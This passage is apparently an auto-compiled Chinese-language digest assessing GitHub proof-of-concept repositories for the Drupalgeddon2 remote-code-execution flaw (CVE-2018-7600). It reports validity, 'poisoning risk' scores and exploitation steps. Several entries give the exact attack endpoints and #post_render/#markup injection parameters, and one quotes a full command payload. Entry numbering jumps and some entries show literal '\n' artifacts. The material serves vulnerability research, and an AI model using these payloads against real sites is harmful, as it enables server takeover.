*   在ModSecurity规则配置中，如果包含了恶意的排除规则，则可能降低WAF的防御能力。然而，提供的配置看起来相对标准。考虑到该项目主要关注漏洞利用演示，而并非恶意软件分发，**投毒风险较低，估计在5%左右。**

**利用方式：**
1.  攻击者识别出运行着未修补的Drupal版本的站点。
2.  攻击者构造恶意请求，通常涉及`q`参数（Drupal的路径处理机制）。
3.  恶意请求利用了Drupal的某些组件对用户输入验证不足的缺陷。
4.  恶意请求导致在服务器上执行任意PHP代码，从而实现远程代码执行。
5.  可以使用Metasploit的`drupalgeddon2`模块自动化漏洞利用过程，或者手动构造payload。

**总结：**
CVE-2018-7600是一个严重的远程代码执行漏洞，利用方式相对简单，且有公开的Metasploit模块可用。尽管代码本身演示了漏洞利用和防御，但仍需警惕潜在的投毒风险。强烈建议受影响的Drupal站点尽快升级到安全版本。

**项目地址:** [tea-celikik/Drupal-Exploit-Lab](https://github.com/tea-celikik/Drupal-Exploit-Lab)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #30

**来源**: [CVE-2018-7600-thehappydinoa_CVE-2018-7600.md](../2018/CVE-2018-7600-thehappydinoa_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时存在缺陷，允许未经身份验证的攻击者通过构造特殊的请求来执行任意代码。

**有效性分析：**

*   漏洞库信息和搜索引擎结果均表明该漏洞是一个严重的安全问题，影响多个Drupal版本，并允许远程代码执行。
*   提供的POC代码尝试通过`drupal_ajax`接口注册用户，并利用`exec` markup执行bash命令。POC会执行`id`命令，并将结果写入一个随机名称的文件中，然后尝试通过HTTP访问该文件以验证漏洞利用是否成功。成功后，会尝试删除该文件。
*   多个Exploit-DB链接（如44448, 44449, 44482）表明存在公开可用的漏洞利用代码。

综合来看，提供的POC代码是有效的，可以用来验证目标Drupal站点是否存在CVE-2018-7600漏洞。

**投毒风险分析：**

*   POC代码本身主要功能是执行命令并将结果写入文件，之后验证文件是否可访问，以验证漏洞存在性。这种模式本身存在潜在的投毒风险，攻击者可以将恶意代码注入到被写入的文件中，或者修改POC使其执行更具破坏性的操作。
*   代码中`random_file_name`变量虽然使用了随机文件名，但如果被成功利用，攻击者可以精确控制写入内容和删除操作，因此存在恶意利用的可能性。
*   `download_command` 和 `rm_command` 如果被篡改，可能导致下载恶意文件或删除重要文件，因此也有潜在风险。
*   `tor_proxy`选项的存在意味着该POC可能被用于隐藏攻击者的真实IP地址，这增加了追踪和溯源的难度。
*   综合代码，投毒风险评估为10%。主要是因为POC的主要目的是验证漏洞，而大规模恶意利用需要在代码层面进行显著修改。

**利用方式分析：**

1.  **构造恶意请求：** 攻击者发送包含恶意代码的特殊构造的HTTP请求到Drupal站点。
2.  **利用`drupal_ajax`接口：** POC利用Drupal的`drupal_ajax`接口来触发漏洞。
3.  **远程代码执行：** 恶意代码通过Drupal的输入处理缺陷被执行，导致远程代码执行。
4.  **验证与清理（POC）：** POC验证代码执行成功后，会尝试清理现场（删除创建的文件）。实际攻击中，攻击者可能会执行更具破坏性的操作，例如安装后门、窃取数据或篡改网站内容。

**项目地址:** [thehappydinoa/CVE-2018-7600](https://github.com/thehappydinoa/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #31

**来源**: [CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md](../2018/CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制受影响的 Drupal 站点

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞源于 Drupal 在处理用户提供的输入时，没有进行充分的验证，攻击者可以通过精心构造的恶意请求，在服务器上执行任意代码。 

**有效性分析：**
根据漏洞库信息和搜索结果，该漏洞是一个经过验证的远程代码执行漏洞，并且存在公开可用的利用代码。大量的安全厂商和研究人员对此漏洞进行了分析和验证，证明其有效性。 

**投毒风险分析：**
提供的Python代码是一个网络数据包捕获脚本，主要用于分析网络流量，特别是HTTP流量，并检测其中是否存在CVE-2018-7600漏洞的利用尝试。 

*   **功能：** 该脚本使用 `pyshark` 库捕获网络接口上的数据包，并分析HTTP请求的URI和POST数据。它查找包含特定关键字（如`exec`, `passthru`, `system`等）的请求，这些关键字通常与远程代码执行攻击相关。  该脚本主要用于检测已知的攻击模式，而不是发起攻击。

*   **潜在投毒风险：** 虽然该脚本本身主要是用于流量分析，但仍然存在一些潜在的风险：
    *   **性能影响：** 在高流量环境下，该脚本可能会消耗大量的CPU和内存资源，导致系统性能下降。 这种消耗如果被恶意利用，可以作为一种拒绝服务攻击。
    *   **数据泄露：** 该脚本会捕获网络数据包，其中可能包含敏感信息，例如用户名、密码、API密钥等。 如果脚本的输出被不当存储或泄露，可能会导致数据泄露。
    *   **依赖风险：** `pyshark` 依赖 `tshark`，如果 `tshark` 本身存在安全漏洞，可能会影响该脚本的安全性。
    *  **后门代码：**代码中没有明显的恶意后门代码，但捕获流量到`csv`文件中可能导致信息泄露，如果该文件可以被外部访问，或者被攻击者替换，则存在风险。

**利用方式：**
根据搜索结果和漏洞描述，攻击者可以通过以下方式利用该漏洞：

1.  发送包含恶意代码的特制HTTP请求，恶意代码通常会嵌入到URL参数或POST数据中。
2.  Drupal 的某些子系统（例如节点创建、用户注册等）在处理这些请求时，由于输入验证不足，会将恶意代码传递给PHP的 `eval()` 函数或其他类似函数执行，从而导致远程代码执行。
3.  攻击者可以利用执行的代码在服务器上安装后门、窃取数据或执行其他恶意操作。

综上，该漏洞利用的有效性很高，但提供的POC代码本身更多是流量分析工具，直接投毒风险较低(5%), 但需要注意潜在的性能影响、数据泄露和依赖风险。攻击者主要通过构造恶意 HTTP 请求来触发漏洞。

**项目地址:** [vphnguyen/ANM_CVE-2018-7600](https://github.com/vphnguyen/ANM_CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #32

**来源**: [CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md](../2018/CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal 7.x (before 7.58), 8.x (before 8.3.9), 8.4.x (before 8.4.6), and 8.5.x (before 8.5.1)

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见模块配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞信息和搜索结果，此漏洞影响多个子系统，利用方式是通过构造特殊的请求，特别是利用`user/password` endpoint，结合`#post_render`属性，触发PHP的`passthru()`函数来执行任意命令。

**有效性：**

提供的PoC代码通过两个步骤利用该漏洞：

1.  发送一个包含恶意参数的POST请求到`user/password`，利用`name[#post_render][]`，`name[#markup]`和`name[#type]`参数注入命令。
2.  从响应中提取`form_build_id`，然后发送另一个包含该`form_build_id`的请求到`file/ajax/name/#value/{form_build_id}`，以触发命令执行。

根据提供的漏洞库信息、搜索结果以及利用代码，可以判断此POC代码是**有效**的，可以利用未修复的Drupal站点执行远程代码。

**投毒风险：**

评估PoC代码是否存在投毒风险：

*   代码相对简短，易于审查。
*   代码的主要功能是利用已知的Drupal漏洞执行命令，没有发现明显的恶意行为。
*   虽然代码中没有直接发现投毒代码，但是任何代码都存在被恶意修改的风险。例如，攻击者可能会修改命令执行部分，使其在执行用户指定的命令之前或之后执行其他恶意操作。

尽管直接投毒证据不多，但考虑到软件供应链的安全风险，以及任何代码都可能被篡改的可能性，综合评估投毒风险为**5%**。这个评估考虑了代码本身的简洁性以及潜在的供应链攻击风险。

**利用方式：**

1.  攻击者首先构造一个包含恶意参数的POST请求，发送到目标Drupal站点的`user/password`路径。
2.  该请求利用了Drupal的表单渲染机制中的漏洞，允许攻击者注入并执行PHP代码。
3.  服务器响应包含一个`form_build_id`，攻击者需要提取该ID。
4.  攻击者使用提取的`form_build_id`构造第二个POST请求，发送到`file/ajax/name/#value/{form_build_id}`路径。
5.  这个请求触发Drupal执行之前注入的PHP代码，从而实现远程代码执行。

通过这种方式，攻击者可以在未经身份验证的情况下，在目标Drupal服务器上执行任意命令，从而完全控制受影响的系统。

**项目地址:** [xxxTectationxxx/CVE-2018-7600](https://github.com/xxxTectationxxx/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #33

**来源**: [CVE-2018-7600-ynsmroztas_drupalhunter.md](../2018/CVE-2018-7600-ynsmroztas_drupalhunter.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个子系统，常见模块配置也可能受到影响。大量Drupal网站受到影响。 

**有效性：**

提供的Python POC代码利用了Drupal的多个漏洞组合来实现远程代码执行。它通过构造特定的请求参数，包括`q`、`name[#post_render][]`、`name[#markup]`和`name[#type]`，以及提交`form_id`和`_triggering_element_name`来触发漏洞。然后，它解析响应以获取`form_build_id`，并使用它来发送另一个请求以执行任意命令。 搜索引擎结果中的多个条目表明该漏洞被广泛利用。

**投毒风险：**

虽然POC代码本身是为了演示漏洞利用而编写的，但存在一定的投毒风险。  如果攻击者修改了POC代码，例如，将command参数修改成下载恶意脚本并执行，那么该POC可以被用来传播恶意软件。 由于代码逻辑相对简单，作者在其中隐藏复杂后门的可能性较低。但是，无法完全排除，所以投毒风险定为10%。

**利用方式：**

1.  攻击者首先构造包含恶意参数的POST请求到目标Drupal站点的`/user/password`路径。
2.  恶意参数包括`q`设置为`user/password`，以及使用`name[#post_render][]`，`name[#markup]`和`name[#type]`来注入要执行的操作系统命令。
3.  服务器响应包含`form_build_id`。
4.  攻击者使用`form_build_id`构造另一个POST请求到`/file/ajax/name/#value/{form_build_id}`，执行先前注入的命令。
5.  命令执行的结果将返回给攻击者。

**项目地址:** [ynsmroztas/drupalhunter](https://github.com/ynsmroztas/drupalhunter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #34

**来源**: [CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md](../2018/CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站启用了默认或常见模块配置，且未打补丁

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求参数，在服务器上执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞利用的有效性很高。漏洞库和搜索引擎结果均表明该漏洞是真实的，且存在公开可用的漏洞利用代码。提供的POC代码 `cve-2018-7600_cmd.py`  能够成功利用该漏洞在目标Drupal服务器上执行任意命令。

**投毒风险：**

仔细审查提供的POC代码 `cve-2018-7600_cmd.py`，初步判断投毒风险较低。代码逻辑较为清晰，主要功能是构造恶意请求，利用Drupal的漏洞执行命令。其中`/exphub.txt`是漏洞利用后留下的命令执行记录，方便查看命令执行情况。

需要注意的是，任何公开的漏洞利用代码都存在被修改和二次发布的风险，攻击者可能在其中添加恶意代码。因此，在使用任何漏洞利用代码前，都应该进行仔细审查，并确保来源可靠。但此仓库只有两个文件且内容较少,投毒风险评估为5%。

**利用方式：**

该漏洞的利用方式主要包括以下步骤：

1.  **确定目标Drupal网站版本：** 攻击者需要确定目标Drupal网站的版本是否在漏洞影响范围内。
2.  **构造恶意请求：** 攻击者需要构造包含恶意代码的请求，其中恶意代码将通过`mail[#markup]`传递给`exec`函数执行。请求的URL为`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`，请求方式为POST，并包含特定的payload，例如`{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': ''+cmd+' | tee exphub.txt'}`。
3.  **发送恶意请求：** 攻击者将构造的恶意请求发送给目标Drupal网站。
4.  **执行任意代码：** 如果目标Drupal网站存在漏洞，恶意请求中的代码将被执行，攻击者从而获得服务器的控制权。

此漏洞是一个典型的输入验证漏洞，攻击者通过精心构造的输入，绕过了Drupal的安全检查，最终导致远程代码执行。

**项目地址:** [zhzyker/CVE-2018-7600-Drupal-POC-EXP](https://github.com/zhzyker/CVE-2018-7600-Drupal-POC-EXP)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---



---

## POC #2

**来源**: [CVE-2018-7600-Damian972_drupalgeddon-2.md](../2018/CVE-2018-7600-Damian972_drupalgeddon-2.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且配置允许远程访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal的远程代码执行漏洞。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以得出以下结论：

**有效性：**

提供的POC代码是有效的漏洞检测脚本。它通过构造特定的URL和POST请求，利用Drupal中的输入验证漏洞，尝试执行任意命令。脚本会检测目标站点是否返回预期的“GOOD”字符串，以判断漏洞是否存在。

**投毒风险：**

该漏洞利用代码主要由一个PHP脚本组成，用于检测Drupal站点是否存在CVE-2018-7600漏洞。脚本的逻辑相对简单，主要功能是发送特定的HTTP请求并检查响应。主要的风险可能存在于以下几个方面：

1.  **命令执行：** 虽然脚本的目的是检测漏洞，但它确实会尝试在目标服务器上执行命令。如果脚本被恶意修改，攻击者可以更改`$command`变量，从而执行任意的恶意命令。
2.  **信息泄露：** 脚本会发送包含特定参数的HTTP请求，这些参数可能会泄露目标站点的信息。
3.  **拒绝服务（DoS）：** 如果脚本被大规模使用，可能会对目标服务器造成一定的负载，导致拒绝服务。

考虑到以上因素，认为此仓库中存在作者隐藏的投毒代码的可能性较低，约为5%。这个假设的依据是代码相对简单，容易审查，并且其主要目的是漏洞检测而非利用。

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含恶意代码的URL或POST请求，利用Drupal的多个子系统中的输入验证漏洞。
2.  **远程代码执行：** 恶意代码通过Drupal的渲染机制执行，导致远程代码执行。

具体来说，对于Drupal 7.x，POC利用`user/password`路径，通过`name[#post_render]`、`name[#type]`和`name[#markup]`参数注入PHP代码。对于Drupal 8.x，POC利用`user/register`路径，通过`element_parents`、`mail[a][#post_render]`、`mail[a][#type]`和`mail[a][#markup]`参数注入PHP代码。这些参数允许在特定情况下执行PHP代码，从而实现远程代码执行。

**总结：**

CVE-2018-7600是一个严重的安全漏洞，允许未经身份验证的攻击者在Drupal站点上执行任意代码。提供的POC代码可以有效地检测该漏洞，但使用时需要注意潜在的风险，以避免对目标系统造成损害。务必确保从可信来源获取利用代码，并在受控环境中进行测试。


**项目地址:** [Damian972/drupalgeddon-2](https://github.com/Damian972/drupalgeddon-2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #3

**来源**: [CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md](../2018/CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站允许未授权用户访问用户注册页面或其他类似的form API接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon 2) 允许未经身份验证的远程攻击者在受影响的Drupal网站上执行任意代码。漏洞存在于 Drupal 的 Form API 中，通过构造特定的POST请求，可以绕过输入验证，导致代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以确认此漏洞利用是有效的。大量资料表明该漏洞已被广泛利用。

**投毒风险：**
分析提供的文件，包括`README.md`, `README.zh-cn.md`, 和 `docker-compose.yml`。这些文件主要包含漏洞描述、环境搭建说明和POC使用方法。`docker-compose.yml` 文件指定了使用 `vulhub/drupal:8.5.0` 镜像，这个镜像本身如果存在后门，可能导致投毒。此外，虽然直接的恶意代码在提供的文件中未发现，但由于攻击者能够执行任意代码，意味着他们完全有可能在目标系统上植入后门或其他恶意程序。

因此，该仓库本身直接包含投毒代码的可能性较低，但通过漏洞利用植入后门的可能性非常高，综合判断投毒风险为10%。

**利用方式：**
1.  **环境搭建：** 使用`docker-compose up -d`命令启动一个包含漏洞的Drupal环境(例如8.5.0版本)。
2.  **发送恶意请求：** 向`/user/register`或其他类似的 form API 接口发送精心构造的POST请求。该请求包含以下关键参数：
    *   `element_parents`: 用于指定表单元素路径，绕过访问控制。
    *   `ajax_form=1`: 触发 Drupal 的 AJAX 处理机制。
    *   `_wrapper_format=drupal_ajax`:  指定响应格式为 Drupal AJAX。
    *   `mail[#post_render][]`:  利用`#post_render`属性执行PHP函数（例如`exec`）。
    *   `mail[#type]=markup`:  将`mail`字段类型设置为markup，允许插入HTML代码。
    *   `mail[#markup]`:  包含要执行的命令（例如`id`）。
3.  **代码执行：** Drupal 在处理该请求时，会执行`mail[#markup]`中指定的命令，从而实现远程代码执行。

**项目地址:** [Dowonkwon/drupal-cve-2018-7600-poc](https://github.com/Dowonkwon/drupal-cve-2018-7600-poc)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #4

**来源**: [CVE-2018-7600-Hestat_drupal-check.md](../2018/CVE-2018-7600-Hestat_drupal-check.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站被完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站未打补丁且存在特定模块配置（默认或常见）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal多个子系统中输入验证不足的问题，执行任意代码。从搜索结果可以看出，该漏洞影响广泛，有大量Drupal网站受到威胁。漏洞利用代码（提供的drupal-check.sh脚本）并非直接利用该漏洞进行攻击，而是用于**检测**Cpanel Apache和默认Apache配置中是否存在利用该漏洞的攻击痕迹，例如扫描访问日志中是否存在特定的payload特征。它主要通过搜索包含`system&name`、`q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name`和`?q=file%2Fajax%2Fname%2F%23value%2Fform-`等字符串的日志条目来判断是否存在攻击行为。该脚本会分析日志中攻击者IP以及可能被攻击的站点。由于给出的脚本是用于日志分析，主要作用是检测，不存在恶意投毒代码。

**利用方式：**

根据漏洞信息和搜索结果，CVE-2018-7600的利用方式如下：

1.  **发送恶意构造的HTTP请求：** 攻击者发送包含特定payload的POST请求，利用Drupal输入验证漏洞。
2.  **利用特定参数：** 常见的payload涉及`q=user%2Fpassword`和`name[#post_render][]`等参数，配合`passthru`或其他代码执行函数。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在Drupal服务器上执行任意代码，从而完全控制网站。

**项目地址:** [Hestat/drupal-check](https://github.com/Hestat/drupal-check)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #5

**来源**: [CVE-2018-7600-M-Abid34_CVE-2018-7600.md](../2018/CVE-2018-7600-M-Abid34_CVE-2018-7600.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码，可能导致完全控制服务器。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且未应用安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本。漏洞利用方式主要通过Drupal的Form API进行攻击。PoC代码通过构造恶意的HTTP请求，利用Drupal的漏洞在目标服务器上执行任意命令。具体来说，攻击者首先“毒化”表单ID，然后利用该ID执行命令。PoC代码中使用了`requests`和`BeautifulSoup`库来发送HTTP请求和解析HTML响应。代码允许指定目标URL、要执行的命令、要使用的函数（默认为`passthru`）以及代理。代码通过设置`q`参数和`name[#post_render][]`等字段来利用漏洞。尽管PoC作者声明其代码仅用于家庭实验室和教育目的，并修改自其他来源，但代码本身看起来是直接可用的漏洞利用工具。投毒风险较低，因为代码相对简单且目标明确，但始终存在作者植入恶意代码的可能性，例如，通过修改执行命令的方式或添加额外的网络请求来收集信息或执行其他恶意操作. 风险评估为5%主要是指在教育/测试环境中，如果未进行充分的安全隔离，可能导致测试环境被污染。

**项目地址:** [M-Abid34/CVE-2018-7600](https://github.com/M-Abid34/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #6

**来源**: [CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权的远程攻击者执行任意代码，完全控制受影响的服务器，导致数据泄露、篡改、拒绝服务或植入恶意软件。

**影响版本:** Drupal 7.x < 7.58, Drupal 8.3.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标系统运行着存在漏洞的Drupal版本，且攻击者能够通过网络访问Drupal站点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是 Drupal 中的一个高危远程代码执行漏洞。该漏洞源于 Drupal Form API (FAPI) 在处理 AJAX 请求时，对数组值过滤不足，允许未经身份验证的攻击者执行任意代码。 

**有效性：**
提供的POC代码（drupalgeddon2.py）是一个Python脚本，旨在利用 CVE-2018-7600 漏洞。根据脚本描述，它包含漏洞检测、多线程和命令输出解析等功能。该脚本利用了 Drupal 的 FAPI 中存在的缺陷，通过构造恶意的 AJAX 请求来执行任意命令。多个来源（如Exploit-DB, Rapid7, NVD）确认了此漏洞的存在，并提供了利用方法。因此，该POC代码被认为是有效的。

**投毒风险：**
代码主要功能为发送恶意请求到目标Drupal服务器，并执行指定的命令。风险主要在于：

1.  **远程执行任意命令：** 脚本允许指定要执行的命令，这可能会导致攻击者在目标系统上运行恶意代码。虽然脚本本身没有包含明显的恶意代码，但是攻击者可以使用它来下载和执行其他恶意脚本。
2.  **日志记录：** 脚本可以将输出记录到文件中。恶意攻击者可能将敏感信息记录到本地日志。

总体而言，该仓库本身没有明显投毒代码,但也不能排除作者隐藏其他后门或者恶意代码的可能， 风险评估为10%。

**利用方式：**
1.  **漏洞触发：** 攻击者构造包含恶意代码的特殊请求，利用 Drupal Form API 在处理 AJAX 请求时的输入验证漏洞。
2.  **代码执行：**  Drupal 在处理该请求时，会执行攻击者注入的恶意代码。
3.  **远程控制：** 攻击者通过执行任意命令来获取服务器的控制权，窃取数据、篡改内容或进行其他恶意活动。

简单来说，攻击者通过发送特制的HTTP请求到存在漏洞的Drupal站点，即可在服务器上执行任意命令，从而实现远程代码执行。

**项目地址:** [SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution](https://github.com/SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #7

**来源**: [CVE-2018-7600-a2u_CVE-2018-7600.md](../2018/CVE-2018-7600-a2u_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 - 远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal 实例需要存在漏洞且可网络访问，无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞是由于对用户提供的输入验证不足而造成的。攻击者可以通过构造特殊的请求来执行任意代码。\n\n**有效性：**
提供的 exploit.py 代码通过 `user/register` 路径利用 Drupal 的一个 AJAX 表单处理缺陷，通过修改 `element_parents` 参数来注入恶意代码。它通过设置 `mail[#post_render][]` 为 `exec`，并利用 `mail[#markup]` 来执行任意命令。代码通过检查目标服务器上是否存在 `hello.txt` 文件来验证漏洞是否利用成功。根据漏洞信息和搜索结果，这个POC 是有效的。\n\n**投毒风险：**
代码仓库主要包含漏洞利用代码、ModSecurity 规则和 .htaccess 规则，旨在利用或防御 CVE-2018-7600 漏洞。`exploit.py` 会在目标机器上写入一个名为 `hello.txt` 的文件，这是一个测试性的操作。\n
`README.md` 文件中明确表示该代码仅用于教育和信息目的，并建议用户采取防护措施，例如更新 Drupal 和设置 WAF 规则。虽然作者声明的意图是好的，但攻击者可能会修改 `exploit.py` 以执行更危险的命令，或者在其他文件中插入恶意代码。\n
`ModSecurity.txt` 和 `htaccess.txt` 文件提供了防御规则，如果使用不当，可能会导致拒绝服务或绕过某些安全策略。\n
综合考虑，该仓库存在一定的投毒风险，但主要体现在用户使用不当或攻击者修改利用代码上，作者有意投毒的可能性较低。因此，我认为投毒风险大约为 10%。\n\n**利用方式：**
1.  攻击者发送包含恶意参数的 POST 请求到 `user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`。
2.  `element_parents` 参数允许攻击者控制表单元素的属性。
3.  `mail[#post_render][]` 设置为 `exec`，指示 Drupal 执行命令。
4.  `mail[#markup]` 包含要执行的命令。
5.  Drupal 执行 `mail[#markup]` 中指定的命令，从而导致远程代码执行。

**项目地址:** [a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #8

**来源**: [CVE-2018-7600-anldori_CVE-2018-7600.md](../2018/CVE-2018-7600-anldori_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制目标服务器

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见的模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时，未进行充分的验证，导致攻击者可以通过构造恶意请求，在目标服务器上执行任意代码。

**有效性：**
